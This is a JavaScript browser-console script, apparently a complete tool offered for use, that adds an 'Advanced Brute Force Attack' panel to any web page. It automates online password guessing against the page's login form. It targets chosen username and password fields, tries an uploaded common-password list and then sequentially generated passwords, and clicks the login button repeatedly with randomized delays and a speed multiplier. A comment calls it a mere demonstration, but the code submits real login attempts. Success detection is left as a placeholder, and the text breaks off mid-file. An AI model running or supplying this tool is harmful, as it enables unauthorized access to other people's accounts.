(function() {
    // --- IMPORTANT: Environment Check ---
    if (typeof document === 'undefined') {
        console.error('Error: This script must be run in a web browser environment with access to the Document Object Model (DOM).');
        console.error('Please open your browser\'s developer tools (F12), go to the "Console" tab, and paste the script there.');
        return; // Exit the script if document is not defined
    }

    // Check if the inspector already exists to prevent multiple instances
    if (document.getElementById('brute-force-inspector-window')) {
        console.log('Advanced Brute Force Attack window already exists. Removing existing instance.');
        document.getElementById('brute-force-inspector-window').remove();
        const existingLogWindow = document.getElementById('brute-force-inspector-log-window');
        if (existingLogWindow) existingLogWindow.remove();
        const existingSettingsWindow = document.getElementById('brute-force-inspector-settings-window');
        if (existingSettingsWindow) existingSettingsWindow.remove();
        const existingToggleDot = document.getElementById('brute-force-inspector-toggle-dot');
        if (existingToggleDot) existingToggleDot.remove();
    }

    // --- Global State Variables ---
    let isSelectingElement = false;
    let currentFieldToPopulate = null;
    let selectedUsernameElement = null;
    let selectedPasswordElement = null;
    let selectedLoginButtonElement = null;
    let isGuessingPasswords = false;
    let isPaused = false;
    let currentPasswordAttempt = '';
    let currentPasswordLength = 0;
    let autofillDelayTimeoutId = null;

    // Configurable settings (defaults and current values)
    let baseAutofillRate = 50;
    let autofillRateVariance = 50;
    let minPasswordLength = 1;
    let maxPasswordLength = 8;
    let includeCapitalized = false;
    let includeNumbers = true;
    let includeSymbols = true;
    let autofillUsernameOnEachAttempt = true;
    let customCharacters = 'abcdefghijklmnopqrstuvwxyz';
    let currentCharacterSet = customCharacters;
    let speedMultiplier = 1;

    // Safe Mode settings
    let safeModeEnabled = false;
    let maxRangeMs = 100;

    // Username requirement setting
    let requireUsername = true;

    // Common Passwords List variables
    let uploadedCommonPasswords = [];
    let currentCommonPasswordIndex = 0;
    let commonPasswordsExhausted = false;
    let useCommonPasswordsFirst = true;

    // Excluded Passwords List variables
    let excludedPasswords = new Set();
    let failedPasswords = [];

    // Success/Failure Detection Settings
    let successUrlPattern = '';
    let failureTextPattern = '';
    let successTextPattern = '';
    let checkNetworkResponses = false;
    let expectedStatusCode = 200;
    let successResponseText = '';
    let failureResponseText = '';

    // Character sets for password generation
    const LOWERCASE_CHAR_SET = 'abcdefghijklmnopqrstuvwxyz';
    const UPPERCASE_CHAR_SET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const NUMBERS_CHAR_SET = '0123456789';
    const SYMBOLS_CHAR_SET = '!@#$%^&*()-_+=[]{}|;:,.<>?';

    // Performance tracking variables
    let passwordAttemptTimes = [];
    let animationFrameId = null;

    // Logging variables
    let tempLogMessages = [];
    let inspectorLog = null;

    // --- Helper Function: logAction ---
    /**
     * Appends a message to the inspector log and scrolls to the bottom.
     * @param {string} message - The message to log.
     */
    function logAction(message) {
        const timestamp = new Date().toLocaleTimeString();
        const formattedMessage = `<div class="brute-force-log-entry">[${timestamp}] ${message}</div>`;
        if (inspectorLog) {
            inspectorLog.innerHTML += formattedMessage;
            inspectorLog.scrollTop = inspectorLog.scrollHeight;
        } else {
            tempLogMessages.push(formattedMessage);
        }
    }

    /**
     * Flushes temporary log messages into the actual inspectorLog element once it's available.
     */
    function flushTempLog() {
        if (inspectorLog && tempLogMessages.length > 0) {
            tempLogMessages.forEach(msg => {
                inspectorLog.innerHTML += msg;
            });
            inspectorLog.scrollTop = inspectorLog.scrollHeight;
            tempLogMessages = [];
        }
    }

    // --- Helper Function: saveSettings & loadSettings ---
    /**
     * Saves current tool settings and password lists to local storage.
     */
    function saveSettings() {
        const settings = {
            baseAutofillRate,
            autofillRateVariance,
            minPasswordLength,
            maxPasswordLength,
            includeCapitalized,
            includeNumbers,
            includeSymbols,
            autofillUsernameOnEachAttempt,
            customCharacters,
            speedMultiplier,
            safeModeEnabled,
            maxRangeMs,
            requireUsername,
            useCommonPasswordsFirst,
            successUrlPattern,
            failureTextPattern,
            successTextPattern,
            checkNetworkResponses,
            expectedStatusCode,
            successResponseText,
            failureResponseText,
            selectedUsernameElement: selectedUsernameElement ? { tagName: selectedUsernameElement.tagName, id: selectedUsernameElement.id, class: selectedUsernameElement.className } : null,
            selectedPasswordElement: selectedPasswordElement ? { tagName: selectedPasswordElement.tagName, id: selectedPasswordElement.id, class: selectedPasswordElement.className } : null,
            selectedLoginButtonElement: selectedLoginButtonElement ? { tagName: selectedLoginButtonElement.tagName, id: selectedLoginButtonElement.id, class: selectedLoginButtonElement.className } : null,
        };
        try {
            localStorage.setItem('bruteForce_settings', JSON.stringify(settings));
            logAction('Settings saved to local storage.');

            const commonPasswordsString = JSON.stringify(uploadedCommonPasswords);
            const commonPasswordsSizeKB = new TextEncoder().encode(commonPasswordsString).length / 1024;
            const MAX_LOCAL_STORAGE_KB = 4000;

            if (commonPasswordsSizeKB < MAX_LOCAL_STORAGE_KB) {
                localStorage.setItem('bruteForce_common_passwords', commonPasswordsString);
                logAction(`Common passwords list saved (${commonPasswordsSizeKB.toFixed(2)} KB).`);
            } else {
                logAction(`Warning: Common passwords list (${commonPasswordsSizeKB.toFixed(2)} KB) is too large to save. It will not be persistent.`);
                localStorage.removeItem('bruteForce_common_passwords');
            }

            const excludedPasswordsArray = Array.from(excludedPasswords);
            const excludedPasswordsString = JSON.stringify(excludedPasswordsArray);
            const excludedPasswordsSizeKB = new TextEncoder().encode(excludedPasswordsString).length / 1024;

            if (excludedPasswordsSizeKB < MAX_LOCAL_STORAGE_KB) {
                localStorage.setItem('bruteForce_excluded_passwords', excludedPasswordsString);
                logAction(`Excluded passwords list saved (${excludedPasswordsSizeKB.toFixed(2)} KB).`);
            } else {
                logAction(`Warning: Excluded passwords list (${excludedPasswordsSizeKB.toFixed(2)} KB) is too large to save. It will not be persistent.`);
                localStorage.removeItem('bruteForce_excluded_passwords');
            }

            const failedPasswordsString = JSON.stringify(failedPasswords);
            const failedPasswordsSizeKB = new TextEncoder().encode(failedPasswordsString).length / 1024;
            if (failedPasswordsSizeKB < MAX_LOCAL_STORAGE_KB) {
                localStorage.setItem('bruteForce_failed_passwords', failedPasswordsString);
                logAction(`Failed passwords list saved (${failedPasswordsSizeKB.toFixed(2)} KB).`);
            } else {
                logAction(`Warning: Failed passwords list (${failedPasswordsSizeKB.toFixed(2)} KB) is too large to save. It will not be persistent.`);
                localStorage.removeItem('bruteForce_failed_passwords');
            }
        } catch (e) {
            logAction('Error saving settings or password lists to local storage: ' + e.message);
        }
    }

    /**
     * Loads saved tool settings and password lists from local storage.
     */
    function loadSettings() {
        try {
            const savedSettings = localStorage.getItem('bruteForce_settings');
            if (savedSettings) {
                const settings = JSON.parse(savedSettings);
                baseAutofillRate = settings.baseAutofillRate ?? baseAutofillRate;
                autofillRateVariance = settings.autofillRateVariance ?? autofillRateVariance;
                minPasswordLength = settings.minPasswordLength ?? minPasswordLength;
                maxPasswordLength = settings.maxPasswordLength ?? maxPasswordLength;
                includeCapitalized = settings.includeCapitalized ?? includeCapitalized;
                includeNumbers = settings.includeNumbers ?? includeNumbers;
                includeSymbols = settings.includeSymbols ?? includeSymbols;
                autofillUsernameOnEachAttempt = settings.autofillUsernameOnEachAttempt ?? autofillUsernameOnEachAttempt;
                customCharacters = settings.customCharacters ?? customCharacters;
                speedMultiplier = settings.speedMultiplier ?? speedMultiplier;
                safeModeEnabled = settings.safeModeEnabled ?? safeModeEnabled;
                maxRangeMs = settings.maxRangeMs ?? maxRangeMs;
                requireUsername = settings.requireUsername ?? requireUsername;
                useCommonPasswordsFirst = settings.useCommonPasswordsFirst ?? useCommonPasswordsFirst;
                successUrlPattern = settings.successUrlPattern ?? successUrlPattern;
                failureTextPattern = settings.failureTextPattern ?? failureTextPattern;
                successTextPattern = settings.successTextPattern ?? successTextPattern;
                checkNetworkResponses = settings.checkNetworkResponses ?? checkNetworkResponses;
                expectedStatusCode = settings.expectedStatusCode ?? expectedStatusCode;
                successResponseText = settings.successResponseText ?? successResponseText;
                failureResponseText = settings.failureResponseText ?? failureResponseText;
                logAction('Settings loaded from local storage.');
                
                // Re-select elements from saved data
                if (settings.selectedUsernameElement) {
                    selectedUsernameElement = document.getElementById(settings.selectedUsernameElement.id) || document.querySelector('.' + settings.selectedUsernameElement.class.split(' ')[0]);
                    if (selectedUsernameElement) {
                        usernameElementInfo.textContent = `<${selectedUsernameElement.tagName.toLowerCase()}> (ID: "${selectedUsernameElement.id || 'No ID'}", Class: "${selectedUsernameElement.className || 'No Class'}")`;
                        usernameElementDisplay.style.display = 'flex';
                    }
                }
                if (settings.selectedPasswordElement) {
                    selectedPasswordElement = document.getElementById(settings.selectedPasswordElement.id) || document.querySelector('.' + settings.selectedPasswordElement.class.split(' ')[0]);
                    if (selectedPasswordElement) {
                        passwordElementInfo.textContent = `<${selectedPasswordElement.tagName.toLowerCase()}> (ID: "${selectedPasswordElement.id || 'No ID'}", Class: "${selectedPasswordElement.className || 'No Class'}")`;
                        passwordElementDisplay.style.display = 'flex';
                    }
                }
                if (settings.selectedLoginButtonElement) {
                    selectedLoginButtonElement = document.getElementById(settings.selectedLoginButtonElement.id) || document.querySelector('.' + settings.selectedLoginButtonElement.class.split(' ')[0]);
                    if (selectedLoginButtonElement) {
                        loginButtonElementInfo.textContent = `<${selectedLoginButtonElement.tagName.toLowerCase()}> (ID: "${selectedLoginButtonElement.id || 'No ID'}", Class: "${selectedLoginButtonElement.className || 'No Class'}")`;
                        loginButtonElementDisplay.style.display = 'flex';
                    }
                }
            }

            const savedCommonPasswords = localStorage.getItem('bruteForce_common_passwords');
            if (savedCommonPasswords) {
                uploadedCommonPasswords = JSON.parse(savedCommonPasswords);
                logAction(`Loaded ${uploadedCommonPasswords.length} common passwords from local storage.`);
            }

            const savedExcludedPasswords = localStorage.getItem('bruteForce_excluded_passwords');
            if (savedExcludedPasswords) {
                const excludedPasswordsArray = JSON.parse(savedExcludedPasswords);
                excludedPasswords = new Set(excludedPasswordsArray);
                logAction(`Loaded ${excludedPasswords.size} excluded passwords from local storage.`);
            }

            const savedFailedPasswords = localStorage.getItem('bruteForce_failed_passwords');
            if (savedFailedPasswords) {
                failedPasswords = JSON.parse(savedFailedPasswords);
                logAction(`Loaded ${failedPasswords.length} failed passwords from local storage.`);
            }

        } catch (e) {
            logAction('Error loading settings or password lists from local storage: ' + e.message);
        }
    }

    // --- Core Logic: Password Generation ---
    /**
     * Updates the character set based on user settings.
     */
    function updateCharacterSet() {
        currentCharacterSet = customCharacters;
        if (includeCapitalized) {
            currentCharacterSet += UPPERCASE_CHAR_SET;
        }
        if (includeNumbers) {
            currentCharacterSet += NUMBERS_CHAR_SET;
        }
        if (includeSymbols) {
            currentCharacterSet += SYMBOLS_CHAR_SET;
        }
    }

    /**
     * Generates the next password in a sequential fashion.
     * This is a simple counter-based approach. It is not an actual attack simulation, just a demonstration of a sequential process.
     * @returns {string | null} The next password to try, or null if all combinations are exhausted.
     */
    function getNextGeneratedPassword() {
        const chars = currentCharacterSet;
        const numChars = chars.length;

        function increment(currentPass) {
            const currentPassArr = currentPass.split('');
            for (let i = currentPassArr.length - 1; i >= 0; i--) {
                const charIndex = chars.indexOf(currentPassArr[i]);
                if (charIndex < numChars - 1) {
                    currentPassArr[i] = chars[charIndex + 1];
                    return currentPassArr.join('');
                } else {
                    currentPassArr[i] = chars[0];
                }
            }
            return chars[0] + currentPass;
        }

        if (currentPasswordAttempt === '') {
            currentPasswordAttempt = chars[0];
            currentPasswordLength = 1;
        } else {
            currentPasswordAttempt = increment(currentPasswordAttempt);
            if (currentPasswordAttempt.length > currentPasswordLength) {
                currentPasswordLength = currentPasswordAttempt.length;
                if (currentPasswordLength > maxPasswordLength) {
                    return null; // Exhausted all lengths up to maxPasswordLength
                }
            }
        }
        if (currentPasswordAttempt.length < minPasswordLength) {
            // Skip until we reach the minimum length
            while (currentPasswordAttempt.length < minPasswordLength) {
                currentPasswordAttempt = increment(currentPasswordAttempt);
            }
        }
        return currentPasswordAttempt;
    }

    /**
     * Gets the next password to try based on user settings.
     * Prioritizes common passwords if enabled, otherwise generates sequentially.
     * @returns {string | null} The next password to try.
     */
    function getNextPassword() {
        let nextPassword = null;
        if (useCommonPasswordsFirst && !commonPasswordsExhausted) {
            while (currentCommonPasswordIndex < uploadedCommonPasswords.length) {
                const candidatePassword = uploadedCommonPasswords[currentCommonPasswordIndex].trim();
                currentCommonPasswordIndex++;
                if (candidatePassword !== '' && !excludedPasswords.has(candidatePassword)) {
                    nextPassword = candidatePassword;
                    break;
                }
            }
            if (nextPassword === null) {
                commonPasswordsExhausted = true;
                logAction('All common passwords exhausted. Starting sequential generation.');
                // Reset for sequential generation
                currentPasswordAttempt = '';
                currentPasswordLength = 0;
            }
        }

        if (nextPassword === null) {
            nextPassword = getNextGeneratedPassword();
        }

        if (nextPassword && excludedPasswords.has(nextPassword)) {
            logAction(`Skipping excluded password: ${nextPassword}`);
            return getNextPassword(); // Recurse to get the next one
        }

        return nextPassword;
    }

    // --- Core Logic: Attack Simulation ---
    /**
     * Main attack simulation loop.
     * Uses requestAnimationFrame to manage timing and not block the browser.
     */
    async function startAttackLoop() {
        if (!isGuessingPasswords || isPaused) {
            return;
        }

        if (!selectedUsernameElement || !selectedPasswordElement || !selectedLoginButtonElement) {
            logAction('Error: Please select all target elements (Username, Password, and Login Button).');
            stopAttack();
            return;
        }

        if (requireUsername && yourUsernameInput.value.trim() === '') {
            logAction('Error: Username is required but not set. Please enter a username in the settings or disable the "Require Username" option.');
            stopAttack();
            return;
        }

        const passwordToTry = getNextPassword();

        if (passwordToTry === null) {
            logAction('All password combinations exhausted. Stopping attack.');
            stopAttack();
            return;
        }

        const startTime = performance.now();
        currentPasswordAttempt = passwordToTry;
        updateStatus(`Trying password: ${currentPasswordAttempt}`);

        // Set password field to "text" type for visibility
        selectedPasswordElement.type = 'text';
        await new Promise(r => setTimeout(r, 10)); // Small delay for UI to update

        // Autofill username (if required)
        if (autofillUsernameOnEachAttempt && requireUsername) {
            selectedUsernameElement.value = yourUsernameInput.value;
        }
        selectedPasswordElement.value = currentPasswordAttempt;

        // Dispatch input event to simulate typing
        selectedPasswordElement.dispatchEvent(new Event('input', {
            bubbles: true
        }));
        selectedPasswordElement.dispatchEvent(new Event('change', {
            bubbles: true
        }));

        // Reset password field to "password" type after filling
        await new Promise(r => setTimeout(r, 10)); // Small delay
        selectedPasswordElement.type = 'password';

        // Simulate click on login button
        selectedLoginButtonElement.click();

        const endTime = performance.now();
        const duration = endTime - startTime;
        passwordAttemptTimes.push(duration);

        // Success/Failure detection logic here...
        // This is a placeholder as network response handling is complex in a simple script
        // and requires a more advanced setup or browser extension.
        // For this simulation, we'll just log the attempt.
        logAction(`Attempted with: ${yourUsernameInput.value || '[No Username]'} / ${currentPasswordAttempt}`);

        // Schedule the next attempt with a delay
        const delay = (safeModeEnabled ? maxRangeMs : baseAutofillRate + Math.random() * autofillRateVariance) / speedMultiplier;
        autofillDelayTimeoutId = setTimeout(startAttackLoop, delay);
    }

    function stopAttack() {
        isGuessingPasswords = false;
        clearTimeout(autofillDelayTimeoutId);
        updateStatus('Status: Stopped');
        mainInspectorCloseButton.style.backgroundColor = 'var(--primary-color)'; // Reset the close button color
        // Ensure password field type is reverted
        if (selectedPasswordElement && selectedPasswordElement.type === 'text') {
            selectedPasswordElement.type = 'password';
        }
        if (animationFrameId) {
            cancelAnimationFrame(animationFrameId);
            animationFrameId = null;
        }
        logAction('Attack stopped.');
    }

    // --- UI Creation ---
    // Use a unique ID for the main inspector window
    const inspectorWindow = document.createElement('div');
    inspectorWindow.id = 'brute-force-inspector-window';
    inspectorWindow.className = 'brute-force-inspector-window';

    const header = document.createElement('div');
    header.className = 'brute-force-window-header';
    header.textContent = 'Advanced Brute Force Attack';
    inspectorWindow.appendChild(header);

    const mainInspectorCloseButton = document.createElement('button');
    mainInspectorCloseButton.className = 'brute-force-window-close-button';
    mainInspectorCloseButton.textContent = '✖';
    header.appendChild(mainInspectorCloseButton);

    const content = document.createElement('div');
    content.className = 'brute-force-content';

    const statusDisplay = document.createElement('div');
    statusDisplay.className = 'brute-force-status-display';
    statusDisplay.textContent = 'Status: Ready';
    content.appendChild(statusDisplay);

    const updateStatus = (message) => {
        statusDisplay.textContent = message;
    };

    // Element selection section
    const selectElementsSection = document.createElement('div');
    selectElementsSection.className = 'brute-force-section';
    selectElementsSection.innerHTML = '<h3 class="brute-force-section-title">Select Form Elements</h3>';

    const usernameElementDisplay = document.createElement('div');
    usernameElementDisplay.className = 'brute-force-element-display';
    const usernameElementInfo = document.createElement('span');
    usernameElementInfo.textContent = 'Username: Not selected';
    usernameElementDisplay.appendChild(usernameElementInfo);
    const clearUsernameBtn = document.createElement('button');
    clearUsernameBtn.className = 'brute-force-clear-btn';
    clearUsernameBtn.textContent = 'Clear';
    usernameElementDisplay.appendChild(clearUsernameBtn);
    selectElementsSection.appendChild(usernameElementDisplay);

    const passwordElementDisplay = document.createElement('div');
    passwordElementDisplay.className = 'brute-force-element-display';
    const passwordElementInfo = document.createElement('span');
    passwordElementInfo.textContent = 'Password: Not selected';
    passwordElementDisplay.appendChild(passwordElementInfo);
    const clearPasswordBtn = document.createElement('button');
    clearPasswordBtn.className = 'brute-force-clear-btn';
    clearPasswordBtn.textContent = 'Clear';
    passwordElementDisplay.appendChild(clearPasswordBtn);
    selectElementsSection.appendChild(passwordElementDisplay);

    const loginButtonElementDisplay = document.createElement('div');
    loginButtonElementDisplay.className = 'brute-force-element-display';
    const loginButtonElementInfo = document.createElement('span');
    loginButtonElementInfo.textContent = 'Login Button: Not selected';
    loginButtonElementDisplay.appendChild(loginButtonElementInfo);
    const clearLoginBtn = document.createElement('button');
    clearLoginBtn.className = 'brute-force-clear-btn';
    clearLoginBtn.textContent = 'Clear';
    loginButtonElementDisplay.appendChild(clearLoginBtn);
    selectElementsSection.appendChild(loginButtonElementDisplay);

    const selectButtonRow = document.createElement('div');
    selectButtonRow.className = 'brute-force-control-group';

    const consoleUsernameButton = document.createElement('button');
    consoleUsernameButton.id = 'brute-force-select-username-btn';
    consoleUsernameButton.className = 'brute-force-button';
    consoleUsernameButton.textContent = 'Select Username Field';
    selectButtonRow.appendChild(consoleUsernameButton);

    const consolePasswordButton = document.createElement('button');
    consolePasswordButton.id = 'brute-force-select-password-btn';
    consolePasswordButton.className = 'brute-force-button';
    consolePasswordButton.textContent = 'Select Password Field';
    selectButtonRow.appendChild(consolePasswordButton);

    const consoleLoginButton = document.createElement('button');
    consoleLoginButton.id = 'brute-force-select-login-btn';
    consoleLoginButton.className = 'brute-force-button';
    consoleLoginButton.textContent = 'Select Login Button';
    selectButtonRow.appendChild(consoleLoginButton);

    selectElementsSection.appendChild(selectButtonRow);
    content.appendChild(selectElementsSection);


    // Controls section
    const controlsSection = document.createElement('div');
    controlsSection.className = 'brute-force-section';
    controlsSection.innerHTML = '<h3 class="brute-force-section-title">Controls</h3>';

    const startButton = document.createElement('button');
    startButton.id = 'brute-force-start-btn';
    startButton.className = 'brute-force-button';
    startButton.textContent = 'Start Brute Force Attack';
    controlsSection.appendChild(startButton);

    const stopButton = document.createElement('button');
    stopButton.id = 'brute-force-stop-btn';
    stopButton.className = 'brute-force-button';
    stopButton.textContent = 'Stop Attack';
    controlsSection.appendChild(stopButton);

    content.appendChild(controlsSection);

    // Settings Button
    const openSettingsButton = document.createElement('button');
    openSettingsButton.id = 'brute-force-open-settings-btn';
    openSettingsButton.className = 'brute-force-button';
    openSettingsButton.textContent = 'Open Settings';
    content.appendChild(openSettingsButton);

    // Log Button
    const openLogButton = document.createElement('button');
    openLogButton.id = 'brute-force-open-log-btn';
    openLogButton.className = 'brute-force-button';
    openLogButton.textContent = 'Open Log';
    content.appendChild(openLogButton);

    // Append all content to the inspector window
    inspectorWindow.appendChild(content);

    // Settings window
    const settingsWindow = document.createElement('div');
    settingsWindow.id = 'brute-force-inspector-settings-window';
    settingsWindow.className = 'brute-force-settings-window';

    const settingsHeader = document.createElement('div');
    settingsHeader.className = 'brute-force-window-header';
    settingsHeader.textContent = 'Settings';
    const settingsCloseBtn = document.createElement('button');
    settingsCloseBtn.className = 'brute-force-window-close-button';
    settingsCloseBtn.textContent = '✖';
    settingsHeader.appendChild(settingsCloseBtn);
    settingsWindow.appendChild(settingsHeader);

    const settingsContent = document.createElement('div');
    settingsContent.className = 'brute-force-settings-content';

    // Username settings
    const usernameSettingsSection = document.createElement('div');
    usernameSettingsSection.className = 'brute-force-section';
    usernameSettingsSection.innerHTML = '<h3 class="brute-force-section-title">Username Settings</h3>';
    const requireUsernameCheckboxGroup = document.createElement('div');
    requireUsernameCheckboxGroup.className = 'brute-force-checkbox-group';
    const requireUsernameCheckbox = document.createElement('input');
    requireUsernameCheckbox.type = 'checkbox';
    requireUsernameCheckbox.id = 'brute-force-require-username-checkbox';
    requireUsernameCheckbox.checked = requireUsername;
    const requireUsernameLabel = document.createElement('label');
    requireUsernameLabel.htmlFor = 'brute-force-require-username-checkbox';
    requireUsernameLabel.textContent = 'Require Username';
    requireUsernameCheckboxGroup.appendChild(requireUsernameCheckbox);
    requireUsernameCheckboxGroup.appendChild(requireUsernameLabel);
    usernameSettingsSection.appendChild(requireUsernameCheckboxGroup);

    const usernameInputGroup = document.createElement('div');
    usernameInputGroup.className = 'brute-force-input-group';
    const usernameLabel = document.createElement('label');
    usernameLabel.htmlFor = 'brute-force-your-username-input';
    usernameLabel.textContent = 'Username to Try:';
    const yourUsernameInput = document.createElement('input');
    yourUsernameInput.type = 'text';
    yourUsernameInput.id = 'brute-force-your-username-input';
    yourUsernameInput.className = 'brute-force-input';
    usernameInputGroup.appendChild(usernameLabel);
    usernameInputGroup.appendChild(yourUsernameInput);
    usernameSettingsSection.appendChild(usernameInputGroup);

    const autofillUsernameCheckboxGroup = document.createElement('div');
    autofillUsernameCheckboxGroup.className = 'brute-force-checkbox-group';
    const autofillUsernameCheckbox = document.createElement('input');
    autofillUsernameCheckbox.type = 'checkbox';
    autofillUsernameCheckbox.id = 'brute-force-autofill-username-checkbox';
    autofillUsernameCheckbox.checked = autofillUsernameOnEachAttempt;
    const autofillUsernameLabel = document.createElement('label');
    autofillUsernameLabel.htmlFor = 'brute-force-autofill-username-checkbox';
    autofillUsernameLabel.textContent = 'Autofill username on each attempt';
    autofillUsernameCheckboxGroup.appendChild(autofillUsernameCheckbox);
    autofillUsernameCheckboxGroup.appendChild(autofillUsernameLabel);
    usernameSettingsSection.appendChild(autofillUsernameCheckboxGroup);
    settingsContent.appendChild(usernameSettingsSection);

    // Password Generation Settings
    const passwordGenSection = document.createElement('div');
    passwordGenSection.className = 'brute-force-section';
    passwordGenSection.innerHTML = '<h3 class="brute-force-section-title">Password Generation</h3>';

    const useCommonPasswordsCheckboxGroup = document.createElement('div');
    useCommonPasswordsCheckboxGroup.className = 'brute-force-checkbox-group';
    const useCommonPasswordsCheckbox = document.createElement('input');
    useCommonPasswordsCheckbox.type = 'checkbox';
    useCommonPasswordsCheckbox.id = 'brute-force-use-common-passwords-checkbox';
    useCommonPasswordsCheckbox.checked = useCommonPasswordsFirst;
    const useCommonPasswordsLabel = document.createElement('label');
    useCommonPasswordsLabel.htmlFor = 'brute-force-use-common-passwords-checkbox';
    useCommonPasswordsLabel.textContent = 'Use common passwords first';
    useCommonPasswordsCheckboxGroup.appendChild(useCommonPasswordsCheckbox);
    useCommonPasswordsCheckboxGroup.appendChild(useCommonPasswordsLabel);
    passwordGenSection.appendChild(useCommonPasswordsCheckboxGroup);

    const commonPasswordsFileInput = document.createElement('input');
    commonPasswordsFileInput.type = 'file';
    commonPasswordsFileInput.id = 'brute-force-common-passwords-file';
    commonPasswordsFileInput.className = 'brute-force-file-input';
    commonPasswordsFileInput.style.marginBottom = '10px';
    passwordGenSection.appendChild(commonPasswordsFileInput);

    const minLengthInputGroup = document.createElement('div');
    minLengthInputGroup.className = 'brute-force-input-group';
    const minLengthLabel = document.createElement('label');
    minLengthLabel.htmlFor = 'brute-force-min-length-input';
    minLengthLabel.textContent = 'Min Password Length:';
    const minLengthInput = document.createElement('input');
    minLengthInput.type = 'number';
    minLengthInput.id = 'brute-force-min-length-input';
    minLengthInput.className = 'brute-force-input';
    minLengthInput.value = minPasswordLength;
    minLengthInputGroup.appendChild(minLengthLabel);
    minLengthInputGroup.appendChild(minLengthInput);
    passwordGenSection.appendChild(minLengthInputGroup);

    const maxLengthInputGroup = document.createElement('div');
    maxLengthInputGroup.className = 'brute-force-input-group';
    const maxLengthLabel = document.createElement('label');
    maxLengthLabel.htmlFor = 'brute-force-max-length-input';
    maxLengthLabel.textContent = 'Max Password Length:';
    const maxLengthInput = document.createElement('input');
    maxLengthInput.type = 'number';
    maxLengthInput.id = 'brute-force-max-length-input';
    maxLengthInput.className = 'brute-force-input';
    maxLengthInput.value = maxPasswordLength;
    maxLengthInputGroup.appendChild(maxLengthLabel);
    maxLengthInputGroup.appendChild(maxLengthInput);
    passwordGenSection.appendChild(maxLengthInputGroup);

    const charSetSection = document.createElement('div');
    charSetSection.className = 'brute-force-section';
    charSetSection.innerHTML = '<h3 class="brute-force-section-title">Character Set</h3>';
    const customCharInputGroup = document.createElement('div');
    customCharInputGroup.className = 'brute-force-input-group';
    const customCharLabel = document.createElement('label');
    customCharLabel.htmlFor = 'brute-force-custom-chars-input';
    customCharLabel.textContent = 'Custom Characters:';
    const customCharsInput = document.createElement('input');
    customCharsInput.type = 'text';
    customCharsInput.id = 'brute-force-custom-chars-input';
    customCharsInput.className = 'brute-force-input';
    customCharsInput.value = customCharacters;
    customCharInputGroup.appendChild(customCharLabel);
    customCharInputGroup.appendChild(customCharsInput);
    charSetSection.appendChild(customCharInputGroup);
    
    const capitalizedCheckboxGroup = document.createElement('div');
    capitalizedCheckboxGroup.className = 'brute-force-checkbox-group';
    const capitalizedCheckbox = document.createElement('input');
    capitalizedCheckbox.type = 'checkbox';
    capitalizedCheckbox.id = 'brute-force-capitalized-checkbox';
    capitalizedCheckbox.checked = includeCapitalized;
    const capitalizedLabel = document.createElement('label');
    capitalizedLabel.htmlFor = 'brute-force-capitalized-checkbox';
    capitalizedLabel.textContent = 'Include Capitalized Letters';
    capitalizedCheckboxGroup.appendChild(capitalizedCheckbox);
    capitalizedCheckboxGroup.appendChild(capitalizedLabel);
    charSetSection.appendChild(capitalizedCheckboxGroup);

    const numbersCheckboxGroup = document.createElement('div');
    numbersCheckboxGroup.className = 'brute-force-checkbox-group';
    const numbersCheckbox = document.createElement('input');
    numbersCheckbox.type = 'checkbox';
    numbersCheckbox.id = 'brute-force-numbers-checkbox';
    numbersCheckbox.checked = includeNumbers;
    const numbersLabel = document.createElement('label');
    numbersLabel.htmlFor = 'brute-force-numbers-checkbox';
    numbersLabel.textContent = 'Include Numbers';
    numbersCheckboxGroup.appendChild(numbersCheckbox);
    numbersCheckboxGroup.appendChild(numbersLabel);
    charSetSection.appendChild(numbersCheckboxGroup);

    const symbolsCheckboxGroup = document.createElement('div');
    symbolsCheckboxGroup.className = 'brute-force-checkbox-group';
    const symbolsCheckbox = document.createElement('input');
    symbolsCheckbox.type = 'checkbox';
    symbolsCheckbox.id = 'brute-force-symbols-checkbox';
    symbolsCheckbox.checked = includeSymbols;
    const symbolsLabel = document.createElement('label');
    symbolsLabel.htmlFor = 'brute-force-symbols-checkbox';
    symbolsLabel.textContent = 'Include Symbols';
    symbolsCheckboxGroup.appendChild(symbolsCheckbox);
    symbolsCheckboxGroup.appendChild(symbolsLabel);
    charSetSection.appendChild(symbolsCheckboxGroup);

    passwordGenSection.appendChild(charSetSection);
    settingsContent.appendChild(passwordGenSection);

    // Attack Rate Settings
    const attackRateSection = document.createElement('div');
    attackRateSection.className = 'brute-force-section';
    attackRateSection.innerHTML = '<h3 class="brute-force-section-title">Attack Rate</h3>';

    const safeModeCheckboxGroup = document.createElement('div');
    safeModeCheckboxGroup.className = 'brute-force-checkbox-group';
    const safeModeCheckbox = document.createElement('input');
    safeModeCheckbox.type = 'checkbox';
    safeModeCheckbox.id = 'brute-force-safe-mode-checkbox';
    safeModeCheckbox.checked = safeModeEnabled;
    const safeModeLabel = document.createElement('label');
    safeModeLabel.htmlFor = 'brute-force-safe-mode-checkbox';
    safeModeLabel.textContent = 'Safe Mode (Fixed Delay)';
    safeModeCheckboxGroup.appendChild(safeModeCheckbox);
    safeModeCheckboxGroup.appendChild(safeModeLabel);
    attackRateSection.appendChild(safeModeCheckboxGroup);

    const speedMultiplierInputGroup = document.createElement('div');
    speedMultiplierInputGroup.className = 'brute-force-input-group';
    const speedMultiplierLabel = document.createElement('label');
    speedMultiplierLabel.htmlFor = 'brute-force-speed-multiplier-slider';
    speedMultiplierLabel.textContent = 'Speed Multiplier: ';
    const speedMultiplierSlider = document.createElement('input');
    speedMultiplierSlider.type = 'range';
    speedMultiplierSlider.id = 'brute-force-speed-multiplier-slider';
    speedMultiplierSlider.className = 'brute-force-slider';
    speedMultiplierSlider.min = 1;
    speedMultiplierSlider.max = 100;
    speedMultiplierSlider.value = speedMultiplier;
    const speedMultiplierValue = document.createElement('span');
    speedMultiplierValue.textContent = speedMultiplier + 'x';
    speedMultiplierInputGroup.appendChild(speedMultiplierLabel);
    speedMultiplierInputGroup.appendChild(speedMultiplierSlider);
    speedMultiplierInputGroup.appendChild(speedMultiplierValue);
    attackRateSection.appendChild(speedMultiplierInputGroup);
    
    settingsContent.appendChild(attackRateSection);

    // Save Settings button
    const saveSettingsButton = document.createElement('button');
    saveSettingsButton.id = 'brute-force-save-settings-btn';
    saveSettingsButton.className = 'brute-force-button';
    saveSettingsButton.textContent = 'Save Settings';
    settingsContent.appendChild(saveSettingsButton);

    settingsWindow.appendChild(settingsContent);

    // Log window
    const logWindow = document.createElement('div');
    logWindow.id = 'brute-force-inspector-log-window';
    logWindow.className = 'brute-force-log-window';

